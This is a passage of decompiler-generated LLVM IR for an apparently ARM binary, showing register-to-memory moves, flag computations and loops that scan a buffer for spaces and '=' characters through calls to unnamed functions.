  store i32 %v2_8654, i32* %r1.global-to-local, align 4
  %v7_920c = icmp slt i32 %v5_91f8, 2
  br i1 %v7_920c, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9204
  %v9_920c = add i32 %v5_91f8, -2
  store i32 %v9_920c, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9204, %bb187
  %v1_9214 = phi i32 [ %v5_91f8, %dec_label_pc_9204 ], [ %v9_920c, %bb187 ]
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v2_9214 = add i32 %v1_9214, %v2_86d0
  %v1_9218 = load i32, i32* @r4, align 4
  %v2_9218 = add i32 %v2_9214, %v1_9218
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v0_921c = load i32, i32* @r7, align 4
  %v1_921c = trunc i32 %v0_921c to i8
  %v3_921c = load i32, i32* @r6, align 4
  %v4_921c = add i32 %v3_921c, %v2_9218
  %v5_921c = inttoptr i32 %v4_921c to i8*
  store i8 %v1_921c, i8* %v5_921c, align 1
  %v0_9220 = load i32, i32* @r5, align 4
  store i32 %v0_9220, i32* %r0.global-to-local, align 4
  %v1_9224 = inttoptr i32 %v0_9220 to i8*
  %v2_9224 = call i32 @function_f93c(i8* %v1_9224)
  %v0_9228 = load i32, i32* @r7, align 4
  store i32 %v0_9228, i32* %r1.global-to-local, align 4
  store i32 %v2_9224, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_9234 = inttoptr i32 %v0_9228 to i32*
  %v3_9234 = call i32 @function_efe8(i32 42, i32* %v2_9234)
  %v0_9238 = load i32, i32* @r4, align 4
  store i32 %v0_9238, i32* @r1, align 4
  store i32 %v3_9234, i32* %r2.global-to-local, align 4
  %v0_9240 = load i32, i32* @r5, align 4
  store i32 %v0_9240, i32* %r0.global-to-local, align 4
  %v3_9244 = inttoptr i32 %v0_9240 to i8*
  %v4_9244 = call i32 @function_fc8c(i8* %v3_9244, i32 %v0_9238, i32 %v3_9234)
  store i32 %v4_9244, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9248 = icmp eq i32 %v4_9244, 0
  store i1 %v2_9248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9248, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9250 = load i32, i32* @sl, align 4
  %v3_9250 = add i32 %v2_9250, 8
  %v4_9250 = inttoptr i32 %v3_9250 to i32*
  store i32 1, i32* %v4_9250, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_91b0, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_925c = call i32 @function_efe8(i32 40, i32* null)
  %v0_9260 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9260, i32* @r1, align 4
  store i32 %v3_925c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_926c = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9260, i32 %v3_925c)
  store i32 %v4_926c, i32* %r0.global-to-local, align 4
  %v2_9270 = icmp eq i32 %v4_926c, -1
  store i1 %v2_9270, i1* %cpsr_c.global-to-local, align 1
  %v7_9270 = icmp eq i32 %v4_926c, -1
  store i1 %v7_9270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9270, label %.thread, label %dec_label_pc_9288

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9280 = load i32, i32* @sl, align 4
  %v3_9280 = add i32 %v2_9280, 12
  %v4_9280 = inttoptr i32 %v3_9280 to i32*
  store i32 0, i32* %v4_9280, align 4
  br label %dec_label_pc_930c

dec_label_pc_9288:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9290 = call i32 @function_efe8(i32 40, i32* null)
  %v0_9294 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9294, i32* @r1, align 4
  store i32 %v3_9290, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_92a0 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9294, i32 %v3_9290)
  store i32 %v4_92a0, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r2.global-to-local, align 4
  %v2_92a8 = add i32 %v4_92a0, %v2_823c
  %v3_92a8 = inttoptr i32 %v2_92a8 to i8*
  %v4_92a8 = load i8, i8* %v3_92a8, align 1
  %v2_92ac = icmp ugt i8 %v4_92a8, 31
  store i1 %v2_92ac, i1* %cpsr_c.global-to-local, align 1
  %v7_92ac = icmp eq i8 %v4_92a8, 32
  store i1 %v7_92ac, i1* %cpsr_z.global-to-local, align 1
  %v2_92b8 = zext i1 %v7_92ac to i32
  %v2_92b8.v4_92a0 = add i32 %v2_92b8, %v4_92a0
  store i32 %v2_92b8.v4_92a0, i32* @r4, align 4
  %v2_92bc = add i32 %v2_92b8.v4_92a0, %v2_823c
  store i32 %v2_92bc, i32* @r5, align 4
  store i32 %v2_92bc, i32* %r0.global-to-local, align 4
  %v1_92c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_92c4 = sub i32 %v1_92c4, %v2_92b8.v4_92a0
  store i32 %v2_92c4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_92d0 = call i32 @function_f9f4(i32 %v2_92bc, i32 %v2_92c4, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_92d0, i32* %r0.global-to-local, align 4
  %v2_92d4 = icmp eq i32 %v5_92d0, -1
  store i1 %v2_92d4, i1* %cpsr_c.global-to-local, align 1
  %v7_92d4 = icmp eq i32 %v5_92d0, -1
  store i1 %v7_92d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92d4, label %dec_label_pc_930c, label %dec_label_pc_92dc

dec_label_pc_92dc:                                ; preds = %dec_label_pc_9288
  %v2_92dc = icmp ne i32 %v5_92d0, 0
  store i1 %v2_92dc, i1* %cpsr_c.global-to-local, align 1
  %v7_92dc = icmp eq i32 %v5_92d0, 1
  store i1 %v7_92dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %ip.global-to-local, align 4
  %v7_92e4 = icmp slt i32 %v5_92d0, 2
  br i1 %v7_92e4, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_92dc
  %v9_92e4 = add i32 %v5_92d0, -2
  store i32 %v9_92e4, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_92dc, %bb190
  %v1_92ec = phi i32 [ %v5_92d0, %dec_label_pc_92dc ], [ %v9_92e4, %bb190 ]
  store i32 %v2_86d0, i32* %ip.global-to-local, align 4
  %v2_92ec = add i32 %v1_92ec, %v2_86d0
  %v1_92f0 = load i32, i32* @r4, align 4
  %v2_92f0 = add i32 %v2_92ec, %v1_92f0
  store i32 %v2_92f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_92f8 = load i32, i32* @r5, align 4
  store i32 %v0_92f8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9300 = load i32, i32* @r6, align 4
  %v4_9300 = add i32 %v3_9300, %v2_92f0
  %v5_9300 = inttoptr i32 %v4_9300 to i8*
  store i8 0, i8* %v5_9300, align 1
  %v2_9304 = inttoptr i32 %v0_92f8 to i8*
  %v3_9304 = call i32 @function_fa60(i8* %v2_9304, i32 10)
  store i32 %v3_9304, i32* %r0.global-to-local, align 4
  %v1_9308 = load i32, i32* @sl, align 4
  %v2_9308 = add i32 %v1_9308, 12
  %v3_9308 = inttoptr i32 %v2_9308 to i32*
  store i32 %v3_9304, i32* %v3_9308, align 4
  br label %dec_label_pc_930c

dec_label_pc_930c:                                ; preds = %.thread, %dec_label_pc_9288, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9310:                                ; preds = %dec_label_pc_94dc, %dec_label_pc_945c, %dec_label_pc_930c
  %v1_931c = phi i32 [ 0, %dec_label_pc_930c ], [ %v0_945c, %dec_label_pc_945c ], [ %v1_931c.pre.pre, %dec_label_pc_94dc ]
  store i32 %v2_823c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_931c = add i32 %v1_931c, %v2_823c
  store i32 %v2_931c, i32* @r4, align 4
  %v3_9320 = call i32 @function_efe8(i32 39, i32* null)
  %v0_9324 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9324, i32* @r1, align 4
  store i32 %v3_9320, i32* %r2.global-to-local, align 4
  %v0_932c = load i32, i32* @r4, align 4
  store i32 %v0_932c, i32* %r0.global-to-local, align 4
  %v3_9330 = inttoptr i32 %v0_932c to i8*
  %v4_9330 = call i32 @function_fc8c(i8* %v3_9330, i32 %v0_9324, i32 %v3_9320)
  store i32 %v4_9330, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_933c = icmp eq i32 %v4_9330, -1
  store i1 %v2_933c, i1* %cpsr_c.global-to-local, align 1
  %v7_933c = icmp eq i32 %v4_9330, -1
  store i1 %v7_933c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_933c, label %dec_label_pc_9548, label %dec_label_pc_9348

dec_label_pc_9348:                                ; preds = %dec_label_pc_9310
  %v0_9348 = load i32, i32* @sl, align 4
  %v1_9348 = add i32 %v0_9348, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r3.global-to-local, align 4
  %v2_934c = icmp ugt i32 %v3_9348, 3
  store i1 %v2_934c, i1* %cpsr_c.global-to-local, align 1
  %v7_934c = icmp eq i32 %v3_9348, 4
  store i1 %v7_934c, i1* %cpsr_z.global-to-local, align 1
  %v8_9350 = icmp sgt i32 %v3_9348, 4
  br i1 %v8_9350, label %dec_label_pc_9548, label %dec_label_pc_9354

dec_label_pc_9354:                                ; preds = %dec_label_pc_9348
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_935c = call i32 @function_efe8(i32 39, i32* null)
  %v0_9360 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9360, i32* @r1, align 4
  store i32 %v3_935c, i32* %r2.global-to-local, align 4
  %v0_9368 = load i32, i32* @r4, align 4
  store i32 %v0_9368, i32* %r0.global-to-local, align 4
  %v3_936c = inttoptr i32 %v0_9368 to i8*
  %v4_936c = call i32 @function_fc8c(i8* %v3_936c, i32 %v0_9360, i32 %v3_935c)
  store i32 %v4_936c, i32* %r0.global-to-local, align 4
  %v1_9374 = load i32, i32* @r5, align 4
  %v2_9374 = add i32 %v1_9374, %v4_936c
  store i32 %v2_9374, i32* @r8, align 4
  %v2_9378 = add i32 %v2_9374, %v2_823c
  %v3_9378 = inttoptr i32 %v2_9378 to i8*
  %v4_9378 = load i8, i8* %v3_9378, align 1
  %v6_9378 = zext i8 %v4_9378 to i32
  store i32 %v6_9378, i32* %r3.global-to-local, align 4
  %v2_937c = icmp ugt i8 %v4_9378, 31
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i8 %v4_9378, 32
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9354
  %v2_9380 = add i32 %v4_936c, 1
  store i32 %v2_9380, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9354, %bb192
  %v1_9390 = phi i32 [ %v4_936c, %dec_label_pc_9354 ], [ %v2_9380, %bb192 ]
  %v1_9384 = load i32, i32* %fp.global-to-local, align 4
  %v2_9384 = sub i32 %v1_9384, %v1_9374
  store i32 %v2_9384, i32* %r3.global-to-local, align 4
  %v2_9388 = sub i32 %v2_9384, %v1_9390
  store i32 %v2_9388, i32* @r7, align 4
  %v0_938c = load i32, i32* @r4, align 4
  %v2_938c = add i32 %v0_938c, %v1_9390
  store i32 %v2_938c, i32* @r6, align 4
  br i1 %v7_937c, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_9390 = add i32 %v1_9390, %v1_9374
  store i32 %v3_9390, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_9388, i32* %r1.global-to-local, align 4
  store i32 %v2_938c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93a4 = call i32 @function_f9f4(i32 %v2_938c, i32 %v2_9388, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_93a4, i32* %r0.global-to-local, align 4
  %v2_93a8 = icmp eq i32 %v5_93a4, -1
  store i1 %v2_93a8, i1* %cpsr_c.global-to-local, align 1
  %v7_93a8 = icmp eq i32 %v5_93a4, -1
  store i1 %v7_93a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93a4, i32* @r4, align 4
  br i1 %v7_93a8, label %dec_label_pc_945c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %bb195
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v2_93b8 = icmp ne i32 %v5_93a4, 0
  store i1 %v2_93b8, i1* %cpsr_c.global-to-local, align 1
  %v7_93b8 = icmp eq i32 %v5_93a4, 1
  store i1 %v7_93b8, i1* %cpsr_z.global-to-local, align 1
  %v7_93bc = icmp slt i32 %v5_93a4, 2
  br i1 %v7_93bc, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_93b4
  %v9_93bc = add i32 %v5_93a4, -2
  store i32 %v9_93bc, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_93b4, %bb196
  %v1_93c0 = load i32, i32* @r8, align 4
  %v2_93c0 = add i32 %v1_93c0, %v2_823c
  store i32 %v2_93c0, i32* @r5, align 4
  %v0_93c4 = load i32, i32* @r6, align 4
  store i32 %v0_93c4, i32* %r0.global-to-local, align 4
  %v0_93c8 = load i32, i32* @r7, align 4
  store i32 %v0_93c8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_93d4 = call i32 @function_f9f4(i32 %v0_93c4, i32 %v0_93c8, i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32 1)
  store i32 %v4_93d4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_93d8 = icmp eq i32 %v4_93d4, 0
  store i1 %v2_93d8, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_93d4, 1
  br i1 %tmp198, label %.dec_label_pc_93f8_crit_edge, label %dec_label_pc_93e0

.dec_label_pc_93f8_crit_edge:                     ; preds = %bb197
  %v1_9400.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_93f8

dec_label_pc_93e0:                                ; preds = %bb197
  %v0_93e0 = load i32, i32* @r6, align 4
  store i32 %v0_93e0, i32* %r0.global-to-local, align 4
  %v0_93e4 = load i32, i32* @r7, align 4
  store i32 %v0_93e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_93f0 = call i32 @function_f9f4(i32 %v0_93e0, i32 %v0_93e4, i32 ptrtoint (i32* @global_var_159dc.36 to i32), i32 1)
  store i32 %v4_93f0, i32* %r0.global-to-local, align 4
  %v1_93f4 = add i32 %v4_93f0, -1
  store i32 %v1_93f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_93f8

dec_label_pc_93f8:                                ; preds = %.dec_label_pc_93f8_crit_edge, %dec_label_pc_93e0
  %v1_9400 = phi i32 [ %v1_9400.pre, %.dec_label_pc_93f8_crit_edge ], [ %v1_93f4, %dec_label_pc_93e0 ]
  %v2_9400 = add i32 %v1_9400, %v2_86d0
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_940c = load i32, i32* @r8, align 4
  %v2_940c = add i32 %v2_9400, %v1_940c
  store i32 %v2_940c, i32* %r3.global-to-local, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v4_9414 = add i32 %v2_940c, -20773
  %v5_9414 = inttoptr i32 %v4_9414 to i8*
  store i8 0, i8* %v5_9414, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9434.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9434

dec_label_pc_9420:                                ; preds = %dec_label_pc_9434
  br i1 %v7_9424, label %dec_label_pc_9464, label %dec_label_pc_942c

dec_label_pc_942c:                                ; preds = %dec_label_pc_9420
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9434

dec_label_pc_9434:                                ; preds = %dec_label_pc_93f8, %dec_label_pc_942c
  %v0_9434 = phi i32 [ %v0_9420, %dec_label_pc_942c ], [ %v0_9434.pre, %dec_label_pc_93f8 ]
  %storemerge6 = phi i32 [ %v1_9448, %dec_label_pc_942c ], [ %storemerge6.pre, %dec_label_pc_93f8 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9434, i32* %r0.global-to-local, align 4
  %v1_9438 = inttoptr i32 %v0_9434 to i8*
  %v2_9438 = call i32 @function_f93c(i8* %v1_9438)
  store i32 %v2_9438, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9440 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9440, i32* %r4.global-to-local, align 4
  %v3_9444 = icmp uge i32 %v2_9438, %v3_9440
  store i1 %v3_9444, i1* %cpsr_c.global-to-local, align 1
  %v9_9444 = icmp eq i32 %v2_9438, %v3_9440
  store i1 %v9_9444, i1* %cpsr_z.global-to-local, align 1
  %v1_9448 = add i32 %v3_9440, 1
  store i32 %v1_9448, i32* %ip.global-to-local, align 4
  %v8_944c = icmp sgt i32 %v2_9438, %v3_9440
  %v0_9420 = load i32, i32* @r5, align 4
  %v2_9420 = add i32 %v0_9420, %v3_9440
  %v3_9420 = inttoptr i32 %v2_9420 to i8*
  %v4_9420 = load i8, i8* %v3_9420, align 1
  %v6_9420 = zext i8 %v4_9420 to i32
  store i32 %v6_9420, i32* %r3.global-to-local, align 4
  %v2_9424 = icmp ugt i8 %v4_9420, 60
  store i1 %v2_9424, i1* %cpsr_c.global-to-local, align 1
  %v7_9424 = icmp eq i8 %v4_9420, 61
  store i1 %v7_9424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_944c, label %dec_label_pc_9420, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9434
  br i1 %v7_9424, label %dec_label_pc_9464, label %dec_label_pc_945c

dec_label_pc_945c:                                ; preds = %dec_label_pc_94a8, %dec_label_pc_94cc, %dec_label_pc_9450, %bb195
  %v0_945c = load i32, i32* @r8, align 4
  store i32 %v0_945c, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9464:                                ; preds = %dec_label_pc_9420, %dec_label_pc_9450
  %v0_9464 = load i32, i32* @sl, align 4
  %v1_9464 = add i32 %v0_9464, 16
  %v2_9464 = inttoptr i32 %v1_9464 to i32*
  %v3_9464 = load i32, i32* %v2_9464, align 4
  store i32 %v3_9464, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9470 = icmp eq i32 %v3_9464, 0
  store i1 %v2_9470, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_9464, 1
  br i1 %tmp199, label %dec_label_pc_94cc, label %dec_label_pc_947c

dec_label_pc_947c:                                ; preds = %dec_label_pc_9464
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_9484:                                ; preds = %dec_label_pc_94a8
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9488 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9488, i32* %r3.global-to-local, align 4
  %v0_948c = load i32, i32* @sl, align 4
  %v1_948c = add i32 %v0_948c, 16
  %v2_948c = inttoptr i32 %v1_948c to i32*
  %v3_948c = load i32, i32* %v2_948c, align 4
  %v1_9490 = add i32 %v3_9488, 1
  store i32 %v1_9490, i32* %ip.global-to-local, align 4
  %v3_9494 = icmp uge i32 %v3_948c, %v1_9490
  store i1 %v3_9494, i1* %cpsr_c.global-to-local, align 1
  %v9_9494 = icmp eq i32 %v3_948c, %v1_9490
  store i1 %v9_9494, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v1_9490, i32* %r1.global-to-local, align 4
  store i32 %v1_9490, i32* %stack_var_-44, align 4
  %v7_94a4 = icmp sgt i32 %v3_948c, %v1_9490
  %v0_94b4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94a4, label %dec_label_pc_9484.dec_label_pc_94a8_crit_edge, label %dec_label_pc_94cc

dec_label_pc_9484.dec_label_pc_94a8_crit_edge:    ; preds = %dec_label_pc_9484
  %v0_94b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9484.dec_label_pc_94a8_crit_edge, %dec_label_pc_947c
  %v0_94b8 = phi i32 [ %v0_94b8.pre, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ %v3_9440, %dec_label_pc_947c ]
  %v0_94b4 = phi i32 [ %v0_94b4.pre, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ %v0_9420, %dec_label_pc_947c ]
  %v0_94a8 = phi i32 [ %v1_9490, %dec_label_pc_9484.dec_label_pc_94a8_crit_edge ], [ 0, %dec_label_pc_947c ]
  %v1_94a8 = and i32 %v0_94a8, 33554432
  %v2_94a8 = icmp ne i32 %v1_94a8, 0
  store i1 %v2_94a8, i1* %cpsr_c.global-to-local, align 1
  %v3_94a8 = mul i32 %v0_94a8, 128
  %v1_94ac = add i32 %v3_94a8, 1472
  %v0_94b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94b0 = add i32 %v1_94ac, %v0_94b0
  store i32 %v2_94b0, i32* %r1.global-to-local, align 4
  store i32 %v0_94b4, i32* %r0.global-to-local, align 4
  store i32 %v0_94b8, i32* %r2.global-to-local, align 4
  %v3_94bc = inttoptr i32 %v0_94b4 to i8*
  %v4_94bc = call i32 @function_fd9c(i8* %v3_94bc, i32 %v2_94b0, i32 %v0_94b8)
  store i32 %v4_94bc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94c0 = icmp eq i32 %v4_94bc, 0
  store i1 %v2_94c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94c0, label %dec_label_pc_9484, label %dec_label_pc_945c

dec_label_pc_94cc:                                ; preds = %dec_label_pc_9484, %dec_label_pc_9464
  %v0_94cc = phi i32 [ %v0_9420, %dec_label_pc_9464 ], [ %v0_94b4.pre, %dec_label_pc_9484 ]
  store i32 %v0_94cc, i32* %r0.global-to-local, align 4
  %v1_94d0 = inttoptr i32 %v0_94cc to i8*
  %v2_94d0 = call i32 @function_f93c(i8* %v1_94d0)
  store i32 %v2_94d0, i32* %r0.global-to-local, align 4
  %v2_94d4 = icmp ugt i32 %v2_94d0, 126
  store i1 %v2_94d4, i1* %cpsr_c.global-to-local, align 1
  %v7_94d4 = icmp eq i32 %v2_94d0, 127
  store i1 %v7_94d4, i1* %cpsr_z.global-to-local, align 1
  %v8_94d8 = icmp sgt i32 %v2_94d0, 127
  br i1 %v8_94d8, label %dec_label_pc_945c, label %dec_label_pc_94dc

dec_label_pc_94dc:                                ; preds = %dec_label_pc_94cc
  %v0_94dc = load i32, i32* @sl, align 4
  %v1_94dc = add i32 %v0_94dc, 16
  %v2_94dc = inttoptr i32 %v1_94dc to i32*
  %v3_94dc = load i32, i32* %v2_94dc, align 4
  %v1_94e0 = and i32 %v3_94dc, 33554432
  %v2_94e0 = icmp ne i32 %v1_94e0, 0
  store i1 %v2_94e0, i1* %cpsr_c.global-to-local, align 1
  %v3_94e0 = mul i32 %v3_94dc, 128
  %v1_94e4 = add i32 %v3_94e0, 1472
  %v0_94e8 = load i32, i32* @r5, align 4
  store i32 %v0_94e8, i32* %r1.global-to-local, align 4
  %v0_94ec = load i32, i32* %sb.global-to-local, align 4
  %v2_94ec = add i32 %v1_94e4, %v0_94ec
  store i32 %v2_94ec, i32* @r0, align 4
  %v2_94f0 = inttoptr i32 %v2_94ec to i8*
  %v3_94f0 = call i32 @function_f964(i8* %v2_94f0, i32 %v0_94e8)
  store i32 %v3_94f0, i32* %r0.global-to-local, align 4
  %v0_94f4 = load i32, i32* @sl, align 4
  %v1_94f4 = add i32 %v0_94f4, 16
  %v2_94f4 = inttoptr i32 %v1_94f4 to i32*
  %v3_94f4 = load i32, i32* %v2_94f4, align 4
  %v0_94f8 = load i32, i32* @r8, align 4
  store i32 %v0_94f8, i32* @r5, align 4
  %v1_94fc = add i32 %v3_94f4, 1
  store i32 %v1_94fc, i32* %r3.global-to-local, align 4
  store i32 %v1_94fc, i32* %v2_94f4, align 4
  %v1_931c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9310

dec_label_pc_9508:                                ; preds = %dec_label_pc_9628
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_950c = load i32, i32* @r4, align 4
  %v2_950c = inttoptr i32 %v1_950c to i32*
  store i32 104, i32* %v2_950c, align 4
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9654, %dec_label_pc_8fe8, %dec_label_pc_9508
  %v0_9510 = load i32, i32* @sl, align 4
  %v1_9510 = add i32 %v0_9510, -1452
  %v2_9510 = inttoptr i32 %v1_9510 to i32*
  %v3_9510 = load i32, i32* %v2_9510, align 4
  store i32 %v3_9510, i32* %r0.global-to-local, align 4
  %v1_9514 = call i32 @function_10608(i32 %v3_9510)
  store i32 %v1_9514, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9520 = load i32, i32* @sl, align 4
  %v2_9520 = add i32 %v1_9520, -1452
  %v3_9520 = inttoptr i32 %v2_9520 to i32*
  store i32 -1, i32* %v3_9520, align 4
  %v0_9524 = load i32, i32* %r2.global-to-local, align 4
  %v1_9524 = trunc i32 %v0_9524 to i8
  %v2_9524 = load i32, i32* @sl, align 4
  %v3_9524 = add i32 %v2_9524, -1448
  %v4_9524 = inttoptr i32 %v3_9524 to i8*
  store i8 %v1_9524, i8* %v4_9524, align 1
  br label %dec_label_pc_87ac

dec_label_pc_952c:                                ; preds = %dec_label_pc_8594
  store i32 %v1_8594, i32* %r3.global-to-local, align 4
  %v1_9530 = trunc i32 %v1_8594 to i8
  store i8 %v1_9530, i8* %v2_85cc, align 1
  %v0_9534 = load i32, i32* @r6, align 4
  %v1_9534 = add i32 %v0_9534, -1452
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v1_9538 = call i32 @function_10608(i32 %v3_9534)
  store i32 %v1_9538, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9540 = load i32, i32* @r6, align 4
  %v2_9540 = add i32 %v1_9540, -1452
  %v3_9540 = inttoptr i32 %v2_9540 to i32*
  store i32 -1, i32* %v3_9540, align 4
  br label %dec_label_pc_85b4

dec_label_pc_9548:                                ; preds = %dec_label_pc_9348, %dec_label_pc_9310
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9550 = call i32 @function_efe8(i32 38, i32* null)
  %v0_9554 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9554, i32* @r1, align 4
  store i32 %v3_9550, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9560 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9554, i32 %v3_9550)
  store i32 %v4_9560, i32* %r0.global-to-local, align 4
  %v2_9564 = icmp eq i32 %v4_9560, -1
  store i1 %v2_9564, i1* %cpsr_c.global-to-local, align 1
  %v7_9564 = icmp eq i32 %v4_9560, -1
  store i1 %v7_9564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9564, label %dec_label_pc_96d8, label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9574 = call i32 @function_efe8(i32 38, i32* null)
  %v0_9578 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9578, i32* @r1, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
